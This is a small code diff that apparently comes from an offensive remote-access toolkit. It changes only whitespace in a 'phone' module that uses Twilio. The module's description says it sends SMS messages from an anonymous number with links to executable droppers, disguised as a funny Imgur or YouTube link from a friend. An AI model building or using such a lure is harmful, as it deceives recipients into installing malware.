@@ -15,9 +15,9 @@ packages = ['twilio']
 platforms = ['win32','linux2','darwin']
 results = {}
 usage = 'phone [sid=SID] [token=TOKEN] [number=NUMBER] [message=MESSAGE]'
-description = """
-Use an anonymous online phone number to send an SMS text message
-containing download links to executable client droppers disguised
+description = """ 
+Use an anonymous online phone number to send an SMS text message 
+containing download links to executable client droppers disguised 
 as a link to a funny image/video on Imgur/YouTUbe sent from a friend
 """
 
